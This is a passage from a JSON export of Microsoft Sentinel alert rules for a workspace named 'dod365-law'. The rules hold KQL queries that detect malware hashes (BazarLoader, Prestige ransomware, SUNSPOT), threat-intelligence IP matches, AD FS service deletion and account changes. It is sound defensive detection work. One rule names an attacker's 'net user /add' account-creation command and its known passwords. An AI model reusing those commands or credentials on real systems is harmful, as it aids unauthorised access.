executing a unique PowerShell script","enabled":true,"description":"Identifies when Azure Run command is used to execute a PowerShell script on a VM that is unique.\nThe uniqueness of the PowerShell script is determined by taking a combined hash of the cmdLets it imports\nand the file size of the PowerShell script. Alerts from this detection indicate a unique PowerShell was executed\nin your environment.","alertRuleTemplateName":"5239248b-abfb-4c6a-8177-b104ade5db56","lastModifiedUtc":"2023-06-23T17:41:32.0514435Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6a2e6d09-669e-4055-bcf4-7787cd7f6db4","name":"6a2e6d09-669e-4055-bcf4-7787cd7f6db4","etag":"\"8800c208-0000-2700-0000-66fdcd1d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_ArbitraryOfficeFileDownloads\n//Description: Detects potential arbitrary file download using a Microsoft Office application. This threat was discovered through the BazarCall malware utilized by call centers in late January 2022.\n//Author: Steven Wan\n//False Positives: None applicable at this time.\n\nlet BazarCallHashes = dynamic ([\n    \"2632c0cc222a6d436b50a418605a7bd4fa8f363ab8d93d10b831cdb28a2ac1bc\", // SHA256 Hash for BazarLoader Malware\n    \"f3b5cf1e40aed4567a8996cf107285907d432b4bc8cc3d0b46aae628813d82d4\", // BazarLoader DLL\n\t\"db53f42e13d2685bd34dbc5c79fad637c9344e72e210ca05504420874e98c2a6\" // SHA256 Hash for BazarLoader Malware\n    ]);\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceProcessEvents | where (((InitiatingProcessFolderPath endswith @\"\\EXCEL.EXE\" or InitiatingProcessFolderPath endswith @\"\\POWERPNT.EXE\" or InitiatingProcessFolderPath endswith @\"\\WINWORD.exe\")) and (InitiatingProcessCommandLine contains \"http://\" or InitiatingProcessCommandLine contains \"https://\") and InitiatingProcessSHA256 has_any(BazarCallHashes))\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\n| project TimeGenerated,SILogDeviceName,AccountName,ActionType,InitiatingProcessCommandLine,InitiatingProcessFolderPath,InitiatingProcessSHA256,ProcessCommandLine","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1202"],"displayName":"BAH_ArbitraryOfficeFileDownloads","enabled":true,"description":"Detects potential arbitrary file download using a Microsoft Office application. This threat was discovered through the BazarCall malware utilized by call centers in late January 2022.\nPLATFORM:Windows\nMITRE:TA0005;T1202","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:45:48.5980856Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7ce8a0bc-6f50-48d6-964a-e7f9864f1f10","name":"7ce8a0bc-6f50-48d6-964a-e7f9864f1f10","etag":"\"88000f30-0000-2700-0000-66fdcfe90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let iocs = externaldata(DateAdded:string,IoC:string,Type:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/ActiniumIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet AVHits = (iocs | where Type =~ \"AVDetection\"| project IoC);\nSecurityAlert\n| where ProviderName == 'MDATP'\n| extend ThreatName_ = tostring(parse_json(ExtendedProperties).ThreatName)\n| where ThreatName_ has_any (AVHits)\n| extend Directory = tostring(parse_json(Entities)[0].Directory), SHA256 = tostring(parse_json(tostring(parse_json(Entities)[0].FileHashes))[2].Value), FileName = tostring(parse_json(Entities)[0].Name), Hostname = tostring(parse_json(Entities)[6].FQDN)| extend AccountName = tostring(parse_json(tostring(parse_json(Entities)[6].LoggedOnUsers))[0].AccountName)\n| project TimeGenerated, AlertName, ThreatName_, ProviderName, AlertSeverity, Description, RemediationSteps, ExtendedProperties, Entities, FileName,SHA256, Directory, Hostname, AccountName\n| extend timestamp = TimeGenerated, HostCustomEntity = Hostname , AccountCustomEntity = AccountName,  FileHashCustomEntity = SHA256, FileHashType = \"SHA256\"\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"FileHashType"},{"identifier":"Value","columnName":"FileHashCustomEntity"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","DefenseEvasion","InitialAccess","Discovery","Execution","Persistence","PrivilegeEscalation","LateralMovement","Collection","Exfiltration","Impact","ResourceDevelopment"],"techniques":["T1102","T1105","T1071","T1568","T1218","T1036","T1112","T1027","T1070","T1562","T1140","T1221","T1566","T1033","T1016","T1057","T1083","T1120","T1047","T1106","T1053","T1204","T1559","T1547","T1137","T1080","T1534","T1021","T1005","T1119","T1025","T1039","T1113","T1020","T1041","T1485","T1491","T1583","T1608"],"displayName":"Aqua Blizzard AV hits - Feb 2022","enabled":true,"description":"Identifies a match in the Security Alert table for MDATP hits related to the Aqua Blizzard actor. This rule doesn't directly map to specific MITRE ATT&CK techniques or subtechniques. Instead, it is part of a broader threat detection and incident response strategy within the \"Initial Access\" tactic. Gamaredon Group, \nID: G0047, Associated Groups: IRON TILDEN, Primitive Bear, ACTINIUM, Armageddon, Shuckworm, DEV-0157. Mapping to group activities.    \n                                                                                                                                                                                                                                                             MITRE -Command and Control (T1105 - Ingress Tool Transfer), Defense Evasion - (T1036 - Masquerading), Initial Access - (T1566 - Phishing), Discovery - (T1082 - System Information Discovery),  Defense Evasion - (T1218 - System Binary Proxy Execution), Discovery - (T1016 - System Network Configuration Discovery)                                                                                                                           Sub techniques - T1036.005, T1566.001, T1218.011, T1016.001\n\nPLATFORM:IaaS,Windows,Microsoft 365\nMITRE:TA0003;T1137;T1137.001;T1137.002;T1137.003;T1137.004;T1137.005;T1137.006,TA0005;T1562;T1562.001,TA0008;T1021;T1021.005;T1080;T1534,TA0009;T1119,TA0040;T1485;T1491;T1491.002","alertRuleTemplateName":"18dbdc22-b69f-4109-9e39-723d9465f45f","lastModifiedUtc":"2024-10-02T22:57:45.2086276Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a6c6659f-d454-43a0-a0ed-ec56c1c4c46b","name":"a6c6659f-d454-43a0-a0ed-ec56c1c4c46b","etag":"\"8500d3df-0000-2700-0000-66fdac3f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h; // Look back 1 hour for AzureActivity logs\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  // Filter out indicators without relevant IP address fields\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  // Select the IP entity based on availability of different IP fields\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  // Exclude local addresses using the ipv4_is_private operator and filtering out specific address prefixes\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and AzureActivity logs to identify potential malicious activity\nIP_Indicators\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    AzureActivity | where TimeGenerated >= ago(dt_lookBack)\n    // renaming time column so it is clear the log this came from\n    | extend AzureActivity_TimeGenerated = TimeGenerated\n)\non $left.TI_ipEntity == $right.CallerIpAddress\n| where AzureActivity_TimeGenerated < ExpirationDateTime\n| summarize AzureActivity_TimeGenerated = arg_max(AzureActivity_TimeGenerated, *) by IndicatorId, CallerIpAddress\n| project AzureActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, TI_ipEntity, CallerIpAddress, \nCaller, OperationNameValue, ActivityStatusValue, CategoryValue, ResourceId, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n| extend timestamp = AzureActivity_TimeGenerated\n| extend Name = iif(Caller has '@', tostring(split(Caller,'@',0)[0]), \"\")\n| extend UPNSuffix = iif(Caller has '@', tostring(split(Caller,'@',1)[0]), \"\")\n| extend AadUserId = iif(Caller !has '@', tostring(Caller), \"\")\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"ResourceId"}]}],"templateVersion":"1.4.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map IP Entity to AzureActivity","enabled":true,"description":"This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in AzureActivity.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004","alertRuleTemplateName":"2441bce9-02e4-407b-8cc7-7d597f38b8b0","lastModifiedUtc":"2024-10-02T20:25:35.2545943Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b1ed576d-b8de-407d-abc8-09eb0beae7af","name":"b1ed576d-b8de-407d-abc8-09eb0beae7af","etag":"\"88003b1c-0000-2700-0000-66fdce8f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue =~ 'Microsoft.ADHybridHealthService/services/delete'\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| project-away claimsJson\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1578"],"displayName":"Microsoft Entra ID Hybrid Health AD FS Service Delete","enabled":true,"description":"This detection uses AzureActivity logs (Administrative category) to identify the deletion of an Microsoft Entra ID Hybrid Health AD FS service instance in a tenant.\nA threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs.\nThe health AD FS service can then be deleted after it is no longer needed via HTTP requests to Azure.\nMore information is available in this blog https://o365blog.com/post/hybridhealthagent/\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0006;T1606;T1606.002","alertRuleTemplateName":"86a036b2-3686-42eb-b417-909fc0867771","lastModifiedUtc":"2024-10-02T22:51:58.6909848Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2e3496a4-f4bb-4775-bf44-7975df8439ac","name":"2e3496a4-f4bb-4775-bf44-7975df8439ac","etag":"\"31000687-0000-2700-0000-649dc25a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let sha256Hashes = dynamic([\"5dd1ca0d471dee41eb3ea0b6ea117810f228354fc3b7b47400a812573d40d91d\", \"5fc44c7342b84f50f24758e39c8848b2f0991e8817ef5465844f5f2ff6085a57\", \"6cff0bbd62efe99f381e5cc0c4182b0fb7a9a34e4be9ce68ee6b0d0ea3eee39c\"]);\nlet signames = dynamic([\"Ransom:Win32/Prestige\"]);\n(union isfuzzy=true\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, FileHashCustomEntity = 'SHA256', Account = SourceUserID\n),\n(imFileEvent\n| where TargetFileSHA256 has_any (sha256Hashes)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(Event\n| where Source =~ \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"], Hashes = tostring(EventDetail.[17].[\"#text\"])\n| extend Hashes = extract_all(@\"(?P<key>\\w+)=(?P<value>[a-zA-Z0-9]+)\", dynamic([\"key\",\"value\"]), Hashes)\n| extend Hashes = column_ifexists(\"Hashes\", dynamic([\"\", \"\"])), CommandLine = column_ifexists(\"CommandLine\", \"\")\n| mv-expand Hashes\n| where Hashes[0] =~ \"SHA256\" and Hashes[1] has_any (sha256Hashes)  \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, Hashes, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), FileHashCustomEntity = tostring(Hashes[1])\n),\n(DeviceEvents\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = tostring(InitiatingProcessSHA256),  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceFileEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = tostring(InitiatingProcessSHA256),  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceImageLoadEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = tostring(InitiatingProcessSHA256),  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(SecurityAlert\n| where ProductName == \"Microsoft Defender Advanced Threat Protection\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where isnotempty(ThreatName)\n| where ThreatName has_any (signames)\n| extend Computer = tostring(parse_json(Entities)[0].HostName)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileHashCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ProcessCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1203"],"displayName":"Prestige ransomware IOCs Oct 2022","enabled":true,"description":"This query looks for file hashes and AV signatures associated with Prestige ransomware \npayload.","alertRuleTemplateName":"bca9c877-2afc-4246-a26d-087ab1cdcd5f","lastModifiedUtc":"2023-06-29T17:41:46.1157864Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a0557fed-bf2a-46ca-bb8f-b630a61f75ce","name":"a0557fed-bf2a-46ca-bb8f-b630a61f75ce","etag":"\"7009e166-0000-2700-0000-669977dc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P2D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// In User & Groups and in Applications, the following \"AccessType\" values in columns PremodifiedInboundSettings and ModifiedInboundSettings are interpreted accordingly\n// When Access Type in premodified inbound settings value was 1 that means that the initial access was allowed. When Access Type in premodified inbound settings value was 2 that means that the initial access was blocked.\n// When Access Type in modified inbound settings value is 1 that means that now access is allowed. When Access Type in modified inbound settings value is 2 that means that now access is blocked.\nAuditLogs\n| where OperationName has \"Update a partner cross-tenant access setting\"\n| mv-apply TargetResource = TargetResources on\n  (\n      where TargetResource.type =~ \"Policy\"\n      | extend Properties = TargetResource.modifiedProperties\n  )\n| mv-apply Property = Properties on\n  (\n      where Property.displayName =~ \"b2bCollaborationInbound\"\n      | extend PremodifiedInboundSettings = trim('\"',tostring(Property.oldValue)),\n               ModifiedInboundSettings = trim(@'\"',tostring(Property.newValue))\n  )\n| where PremodifiedInboundSettings != ModifiedInboundSettings\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingAppName"},{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","Discovery"],"techniques":["T1078","T1136","T1087"],"displayName":"Cross-tenant Access Settings Organization Inbound Collaboration Settings Changed","enabled":true,"description":"Organizations are added in the Cross-tenant Access Settings to control communication inbound or outbound for users and applications. This detection notifies when Organization Inbound Collaboration Settings are changed for \"Users & Groups\" and for \"Applications\".","alertRuleTemplateName":"c895c5b9-0fc6-40ce-9830-e8818862f2d5","lastModifiedUtc":"2024-07-18T20:15:18.5038004Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/69cfc00d-8e7b-4265-bfe9-6170abe9119c","name":"69cfc00d-8e7b-4265-bfe9-6170abe9119c","etag":"\"87005b66-0000-2700-0000-66fdc2870000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceProcessEvents \n| where InitiatingProcessCommandLine has_all('net user', '/add') \n| parse InitiatingProcessCommandLine with * \"user \" username \" \"* \n| extend password = extract(@\"\\buser\\s+[^\\s]+\\s+([^\\s]+)\", 1, InitiatingProcessCommandLine) \n| where username in('DefaultAccount') or password in('P@ssw0rd1234', '_AS_@1394') \n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","DefenseEvasion","Discovery","CommandAndControl"],"techniques":["T1059","T1562","T1087","T1105"],"displayName":"DEV-0270 New User Creation","enabled":true,"description":"The following query tries to detect creation of a new user using a known DEV-0270 username/password schema\nPLATFORM:Microsoft 365,IaaS,Windows\nMITRE:TA0005;T1562,TA0007;T1087;T1087.003;T1087.004","alertRuleTemplateName":"7965f0be-c039-4d18-8ee8-9a6add8aecf3","lastModifiedUtc":"2024-10-02T22:00:39.2875963Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d306411b-3c57-47fa-b567-57dc34fedc20","name":"d306411b-3c57-47fa-b567-57dc34fedc20","etag":"\"8600ad6c-0000-2700-0000-66fdb34a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let SUNSPOT_Hashes = dynamic([\"c45c9bda8db1d470f1fd0dcc346dc449839eb5ce9a948c70369230af0b3ef168\", \"0819db19be479122c1d48743e644070a8dc9a1c852df9a8c0dc2343e904da389\"]);\nunion isfuzzy=true(\nDeviceEvents\n| where InitiatingProcessSHA256 in (SUNSPOT_Hashes)),\n(DeviceImageLoadEvents\n| where InitiatingProcessSHA256 in (SUNSPOT_Hashes))\n| extend timestamp=TimeGenerated\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountUpn"},{"identifier":"Name","columnName":"InitiatingProcessAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingProcessAccountDomain"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1554"],"displayName":"SUNSPOT malware hashes","enabled":true,"description":"This query uses Microsoft Defender for Endpoint data to look for IoCs associated with the SUNSPOT malware shared by Crowdstrike.\nMore details: \n  - https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/ \n  - https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-your-software-build-process-with-azure-sentinel/ba-p/2140807\nPLATFORM:Microsoft 365,IaaS,Azure AD,Windows\nMITRE:TA0003;T1546","alertRuleTemplateName":"53e936c6-6c30-4d12-8343-b8a0456e8429","lastModifiedUtc":"2024-10-02T20:55:37.6914465Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a83dd84f-5469-4d4a-91f9-545494a7e82e","name":"a83dd84f-5469-4d4a-91f9-545494a7e82e","etag":"\"8600a9c8-0000-2700-0000-66fdb8420000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let PIM = dynamic([\"MS-PIM-Fairfax\", \"MS-PIM\"]);\nAuditLogs\n| where Category =~ \"RoleManagement\"\n| where OperationName has \"Add member to role outside of PIM\"\n    or (LoggedByService =~ \"Core Directory\" and OperationName =~ \"Add member to role\" and Identity !in (PIM))\n| mv-apply TargetResource = TargetResources on \n    (\n    where TargetResource.type =~ \"User\"\n    | extend 